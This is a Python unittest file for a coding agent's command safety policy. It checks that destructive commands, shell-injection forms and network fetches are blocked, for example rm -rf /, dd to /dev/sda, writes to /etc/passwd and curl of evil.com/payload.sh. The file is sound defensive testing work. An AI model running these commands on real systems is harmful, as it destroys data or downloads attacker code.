from __future__ import annotations

from pathlib import Path
import sys
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from issue_to_pr_agent.domain.entities import CommandDecision
from issue_to_pr_agent.domain.policies.safety import SafetyPolicy
from issue_to_pr_agent.shared.exceptions import PolicyError


class SafetyPolicyTests(unittest.TestCase):
    def test_assess_commands_blocks_destructive_inputs(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        assessments = policy.assess_commands(["git status --short", "rm -rf /tmp/build"])
        self.assertEqual(assessments[0].decision, CommandDecision.ALLOW)
        self.assertEqual(assessments[1].decision, CommandDecision.BLOCK)

    def test_branch_prefix_is_enforced(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        with self.assertRaises(PolicyError):
            policy.ensure_branch_name("feature/custom")

    # Test blocked destructive commands
    def test_blocks_rm_rf(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["rm -rf /"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_sudo_without_trailing_space(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        # sudo as entire command
        result = policy.assess_commands(["sudo"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_sudo_with_args(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["sudo rm -rf /tmp"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_chmod_777(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["chmod 777 /etc/passwd"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_git_reset_hard(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["git reset --hard HEAD~5"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_git_clean(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["git clean -fd"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    # Test shell injection patterns
    def test_blocks_bash_c(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["bash -c 'rm -rf /'"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_sh_c(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["sh -c 'echo pwned'"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_python_c(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["python -c 'import os; os.system(\"rm -rf /\")'"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_python3_c(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["python3 -c 'print(1)'"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_eval(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["eval echo hello"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    # Test shell operators
    def test_blocks_pipe_operator(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["cat /etc/passwd | grep root"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_semicolon_chain(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["echo hello; rm -rf /"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_and_chain(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["test -f file && rm file"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_or_chain(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["test -f file || echo missing"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_command_substitution_dollar(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["echo $(whoami)"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_command_substitution_backtick(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["echo `whoami`"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_output_redirection(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["echo pwned > /etc/passwd"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_append_redirection(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["echo pwned >> /etc/passwd"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    # Test network commands
    def test_blocks_curl(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["curl https://evil.com/payload.sh"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_wget(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["wget https://evil.com/payload"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    # Test allowed commands pass through
    def test_allows_git_status(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["git status --short"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_git_diff(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["git diff HEAD"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_pytest(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["pytest tests/"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_python_m_pytest(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["python3 -m pytest -v"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_python_m_unittest(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["python3 -m unittest discover -s tests -v"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_npm_test(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["npm test"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_cargo_test(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["cargo test"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_go_test(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["go test ./..."])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_rg_search(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["rg TODO src/"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_find(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["find . -name '*.py'"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    def test_allows_ls(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["ls -la src/"])
        self.assertEqual(result[0].decision, CommandDecision.ALLOW)

    # Test REVIEW for unknown commands
    def test_reviews_unknown_command(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["make build"])
        self.assertEqual(result[0].decision, CommandDecision.REVIEW)

    def test_reviews_empty_command(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands([""])
        self.assertEqual(result[0].decision, CommandDecision.REVIEW)

    # Test branch prefix
    def test_branch_prefix_allows_valid_branch(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        policy.ensure_branch_name("agent/issue-42")  # Should not raise

    def test_blocks_git_push(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["git push origin main"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_mkfs(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["mkfs.ext4 /dev/sda1"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)

    def test_blocks_dd(self) -> None:
        policy = SafetyPolicy(branch_prefix="agent/")
        result = policy.assess_commands(["dd if=/dev/zero of=/dev/sda"])
        self.assertEqual(result[0].decision, CommandDecision.BLOCK)
